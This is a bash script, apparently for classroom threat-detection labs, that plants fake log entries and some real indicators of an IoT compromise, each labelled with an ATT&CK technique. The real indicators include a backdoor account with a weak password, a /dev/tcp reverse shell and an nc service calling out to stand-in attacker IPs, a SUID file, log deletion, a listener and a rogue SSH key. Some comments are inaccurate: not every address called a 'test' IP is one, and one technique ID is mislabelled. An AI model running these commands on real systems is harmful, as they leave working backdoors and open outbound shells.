#!/bin/bash
# ============================================
# IoT  Infection Simulation - v3 (Lightweight)
# Full ATT&CK tactic coverage for classroom labs
# Tested on Ubuntu-based hosts
# Author: Daniel Jeremiah
# Date: 14/09/2025
# ============================================

set -euo pipefail

echo "[*] Starting IoT  infection setup..."

# Helper: require sudo for system changes
if [[ $EUID -ne 0 ]]; then
  echo "[!] Please run as root: sudo bash iot_fake_infection_v3.2.sh"
  exit 1
fi

# Safe test IPs and domains (TEST-NET addresses)
ATTACKER_EXT_IP_A="203.0.113.10"
ATTACKER_EXT_IP_B="198.51.100.77"
ATTACKER_TOR_IP="185.220.101.5"
ATTACKER_EXFIL_IP="185.220.101.23"
LATERAL_IP="10.0.0.5"
C2_DOMAIN_A="malware.c2.iothacker.ru"
C2_DOMAIN_B="testdom123456.badc2.net"

# Create a timestamp helper
ts() { date "+%b %d %H:%M:%S"; }

# ------------------------------------------------
# 1) RECONNAISSANCE  (T1595 Active Scanning)
# ------------------------------------------------
echo "$(ts) $(hostname) nmap[2222]: Scanned 10.0.0.0/24 for open ports" >> /var/log/syslog
echo "[+] Recon:  nmap scan log written to /var/log/syslog"

# ------------------------------------------------
# 2) RESOURCE DEVELOPMENT  (T1585 Establish Accounts)
# ------------------------------------------------
if ! id hacker >/dev/null 2>&1; then
  useradd hacker -m -s /bin/bash
  echo "hacker:hacked123" | chpasswd
fi
echo "[+] Resource Development:  attacker account 'hacker' present"

# ------------------------------------------------
# 3) INITIAL ACCESS  (T1078 Valid Accounts)
# ------------------------------------------------
echo "$(ts) $(hostname) sshd[3333]: Accepted password for hacker from ${ATTACKER_TOR_IP} port 5555 ssh2" >> /var/log/auth.log
echo "[+] Initial Access:  successful SSH login for 'hacker' recorded"

# ------------------------------------------------
# 4) EXECUTION  (T1059.004 Unix Shell)
# ------------------------------------------------
# harmless reverse shell attempt that goes nowhere
nohup bash -c "exec bash -i >/dev/tcp/${ATTACKER_EXT_IP_A}/4444 2>&1 <&1" >/dev/null 2>&1 &
echo "[+] Execution: simulated reverse shell attempt to ${ATTACKER_EXT_IP_A}:4444"

# ------------------------------------------------
# 5) PERSISTENCE  (T1053.003 Cron)  (T1543.002 Systemd Service)
# ------------------------------------------------
# Cron entry (does not run anything harmful, just a harmless echo)
if ! grep -q "/tmp/cryptominer" /etc/crontab 2>/dev/null; then
  echo "* * * * * root /bin/echo cron_heartbeat > /tmp/cryptominer_heartbeat" >> /etc/crontab
fi
echo "[+] Persistence: cron entry added in /etc/crontab (harmless heartbeat)"

# systemd service that makes a benign outbound attempt with nc
cat >/etc/systemd/system/c2-client.service <<'UNIT'
[Unit]
Description= C2 Client
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'command -v nc >/dev/null 2>&1 && nc 198.51.100.77 9001 || sleep 5'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload
systemctl enable c2-client.service >/dev/null 2>&1 || true
echo "[+] Persistence: systemd service c2-client.service installed and enabled"

# ------------------------------------------------
# 6) PRIVILEGE ESCALATION  (T1068 Exploitation for Privilege Escalation - simulated SUID)
# ------------------------------------------------
cat >/usr/local/bin/suid-shell <<'SUID'
#!/bin/bash
echo "root shell simulated"
SUID
chmod +x /usr/local/bin/suid-shell
chmod u+s /usr/local/bin/suid-shell
echo "[+] PrivEsc:  SUID backdoor at /usr/local/bin/suid-shell"

# ------------------------------------------------
# 7) DEFENCE EVASION  (T1070 Indicator Removal)  (T1036.005 Masquerading)
# ------------------------------------------------
# Masqueraded hidden helper
cat >/usr/local/bin/.update <<'HID'
#!/bin/bash
echo " backdoor running..."
HID
chmod +x /usr/local/bin/.update
echo "[+] Defence Evasion: hidden binary /usr/local/bin/.update created"

# Log tampering: drop the first 2 lines if file has content
if [[ -s /var/log/auth.log ]]; then
  sed -i '1,2d' /var/log/auth.log || true
fi
echo "$(ts) $(hostname) syslogd[4444]: auth.log cleared by root" >> /var/log/syslog
echo "[+] Defence Evasion: simulated indicator removal in auth.log"

# ------------------------------------------------
# 8) CREDENTIAL ACCESS  (T1110 Brute Force)
# ------------------------------------------------
for i in {1..5}; do
  echo "$(ts) $(hostname) sshd[5555]: Failed password for invalid user admin from 103.21.244.15 port 4482${i} ssh2" >> /var/log/auth.log
  sleep 0.1
done
echo "[+] Credential Access:  brute-force attempts recorded"

# ------------------------------------------------
# 9) DISCOVERY  (T1083 File and Directory Discovery)
# ------------------------------------------------
echo "$(ts) $(hostname) hacker: Enumerated /etc/passwd and /home directories" >> /var/log/syslog
echo "[+] Discovery:  enumeration trace written to syslog"

# ------------------------------------------------
# 10) LATERAL MOVEMENT  (T1021.004 Remote Services: SSH)
# ------------------------------------------------
# Safer approach: log another accepted SSH from an internal IP to show pivot
echo "$(ts) $(hostname) sshd[6666]: Accepted password for hacker from ${LATERAL_IP} port 60022 ssh2" >> /var/log/auth.log
echo "[+] Lateral Movement:  SSH session from ${LATERAL_IP} recorded"

# ------------------------------------------------
# 11) COLLECTION  (T1074.001 Local Data Staging)
# ------------------------------------------------
echo "Sensitive IoT config" > /tmp/exfil_data.txt
chmod 600 /tmp/exfil_data.txt
echo "[+] Collection: staged file /tmp/exfil_data.txt"

# ------------------------------------------------
# 12) EXFILTRATION  (T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol)
# ------------------------------------------------
echo "$(ts) $(hostname) scp[7777]: Sent /tmp/exfil_data.txt to ${ATTACKER_EXFIL_IP}" >> /var/log/auth.log
echo "[+] Exfiltration:  SCP transfer recorded to ${ATTACKER_EXFIL_IP}"

# ------------------------------------------------
# 13) COMMAND AND CONTROL  (T1571 Non-Standard Port)  (T1071.004 DNS)
# ------------------------------------------------
# Listener on a non-standard port
nohup nc -lvnp 31337 >/dev/null 2>&1 &
# DNS beacons
dig "${C2_DOMAIN_A}" @8.8.8.8 >/dev/null 2>&1 || true
dig "${C2_DOMAIN_B}" @8.8.8.8 >/dev/null 2>&1 || true
echo "[+] C2: listener on 31337; DNS lookups issued for ${C2_DOMAIN_A} and ${C2_DOMAIN_B}"

# ------------------------------------------------
# 14) IMPACT  (T1496 Resource Hijacking - simulated only)
# ------------------------------------------------
echo "$(ts) $(hostname) miner[8888]: Started mining operation, consuming CPU" >> /var/log/syslog
echo "[+] Impact:  miner activity noted in syslog (no real load)"

echo "[*] IoT  infection setup complete."


# ------------------------------------------------
# LATERAL MOVEMENT (T1021.002 FTP Remote Services)
# ------------------------------------------------
echo "$(date '+%b %d %H:%M:%S') $(hostname) vsftpd[9999]: CONNECT: Client ${ATTACKER_TOR_IP} login successful for user hacker" >> /var/log/auth.log
echo "[+] Lateral Movement:  FTP login recorded from ${ATTACKER_TOR_IP}"

# ------------------------------------------------
# LATERAL MOVEMENT v1 (T1021.002 FTP - file transfer)
# ------------------------------------------------
echo "$(date '+%b %d %H:%M:%S') $(hostname) ftp[5555]: hacker uploaded tool.bin to /incoming/tool.bin from ${ATTACKER_TOR_IP}" >> /var/log/auth.log
echo "[+] Lateral Movement: simulated FTP file transfer from attacker"


# ------------------------------------------------
# COLLECTION (T1115 Clipboard Data)
# ------------------------------------------------
echo "Sensitive copied text (simulated)" > /tmp/clipboard_dump.txt
echo "$(date '+%b %d %H:%M:%S') $(hostname) hacker: Collected clipboard data to /tmp/clipboard_dump.txt" >> /var/log/syslog
echo "[+] Collection: clipboard data simulated"

# ------------------------------------------------
# EXFILTRATION (T1030 Data Transfer Size Limits)
# ------------------------------------------------
dd if=/dev/zero of=/tmp/largefile.bin bs=1M count=200 >/dev/null 2>&1
echo "$(date '+%b %d %H:%M:%S') $(hostname) scp[7778]: Upload of /tmp/largefile.bin aborted - exceeded transfer size limit" >> /var/log/auth.log
echo "[+] Exfiltration: large file transfer simulated"

# ------------------------------------------------
# PERSISTENCE (T1098.004 SSH Authorized Keys)
# ------------------------------------------------
mkdir -p /home/hacker/.ssh
echo "ssh-rsa AAAAB3NzaKey hacker@attacker" >> /home/hacker/.ssh/authorized_keys
chmod 600 /home/hacker/.ssh/authorized_keys
echo "$(date '+%b %d %H:%M:%S') $(hostname) hacker: Added rogue SSH key to authorized_keys" >> /var/log/syslog
echo "[+] Persistence: rogue SSH authorized_keys entry added"

# ------------------------------------------------
# PERSISTENCE  v1 (T1546 Event Triggered Execution - KV Botnet style)
# ------------------------------------------------
echo "KV Botnet Activity: monitoring process execution events" > /tmp/kvbotnet_monitor.log
echo "$(date '+%b %d %H:%M:%S') $(hostname) kvbotnetd[4444]: Terminated process busybox (simulated)" >> /var/log/syslog
echo "[+] Persistence: simulated KV Botnet event-triggered execution"

# ------------------------------------------------
# EXECUTION (T1559 Inter-Process Communication - PITSTOP)
# ------------------------------------------------
SOCKET_DIR="/tmp/pitstop"
mkdir -p $SOCKET_DIR
SOCKET_FILE="$SOCKET_DIR/wd.fd"
echo "PITSTOP  socket listener" > "$SOCKET_FILE"
echo "$(date '+%b %d %H:%M:%S') $(hostname) pitstopd[2222]: Listening on $SOCKET_FILE" >> /var/log/syslog
echo "[+] Execution: PITSTOP  Unix domain socket created"
